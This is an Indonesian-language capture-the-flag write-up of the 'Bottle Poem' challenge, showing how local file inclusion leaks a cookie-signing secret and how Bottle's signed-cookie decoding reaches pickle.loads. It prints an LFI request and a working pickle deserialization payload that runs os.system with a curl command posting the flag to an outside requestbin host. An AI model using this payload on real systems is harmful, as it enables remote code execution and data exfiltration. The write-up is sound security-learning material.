# Bottle Poem
vulnerability: LFI plus python bottle library with pickle deserialization RCE 

Pertama kita perlu mengetahui letak dari program-nya

```http
GET /show?id=/proc/thread-self/cmdline HTTP/1.1
```

setelah itu saya coba untuk meng-lfi semua file yang ada disana, antaralain

- ./config/secret.py: disini saya menemukan key untuk encode cookie "name"
- ./app.py: ini merupakan aplikasi utama-nya
- ./views/\<semua yang bisa saya temukan nama foldernya> 

Saya mencoba untuk mereplikasi program tersebut menggunakan file-file yang sudah saya temukan tadi, dan menjalankannya di localhost. 
Setelah sekian lama melihat source code dari app.py, disini saya curiga, bahwa vulnerabilitynya bukan berada di app.py tersebut, namun berada di library bottle.

Saat melihat source code bottle.py kita bisa melihat fungsi
```python
    def get_cookie(self, key, default=None, secret=None):
        """ Return the content of a cookie. To read a `Signed Cookie`, the
            `secret` must match the one used to create the cookie (see
            :meth:`BaseResponse.set_cookie`). If anything goes wrong (missing
            cookie or wrong signature), return a default value. """
        value = self.cookies.get(key)
        if secret and value:
            dec = cookie_decode(value, secret) # (key, value) tuple or None
            return dec[1] if dec and dec[0] == key else default
        return value or default
```
dan
```python
def cookie_decode(data, key):
    ''' Verify and decode an encoded string. Return an object or None.'''
    data = tob(data)
    if cookie_is_encoded(data):
        sig, msg = data.split(tob('?'), 1)
        if _lscmp(sig[1:], base64.b64encode(hmac.new(tob(key), msg, digestmod=hashlib.md5).digest())):
            return pickle.loads(base64.b64decode(msg))
    return None
```

mata saya langsung tertuju di library pickle yang merupakan module serialization dan deserialization di python. saya coba cari di google dan mendapatkan ini: [https://davidhamann.de/2020/04/05/exploiting-python-pickle/](https://davidhamann.de/2020/04/05/exploiting-python-pickle/ "https://davidhamann.de/2020/04/05/exploiting-python-pickle/") 

## exploitasi
saya sedikit mengubah source code dari app.py dengan menyelipkan payload pickle rce

```python
...snip..
@route("/sign")
def index():
    try:
        COMMAND = """curl -X POST -d "fizz=`/flag`" https://requestbin.io/19b9tzf1"""
        class PickleRce(object):
            def __reduce__(self):
                import os
                return (os.system,(COMMAND,))
        session = request.get_cookie("name", secret=sekai)
        if not session or session["name"] == "guest":
            session = {"name": PickleRce()}
            response.set_cookie("name", session, secret=sekai)
            return template("guest", name=session["name"])
        if session["name"] == "admin":
            return template("admin", name=session["name"])
    except:
        return "pls no hax"
...snip...
```

jalankan di localhost, masuk ke "localhost:\<port>/sign" lalu copy paste

![](Pasted%20image%2020221004173301.png)

masukkan ke cookie tersebut di "http://bottle-poem.ctf.sekai.team/sign"

dan boom, kita mendapatkan flagnya dari webhook kita

![](Pasted%20image%2020221004173340.png)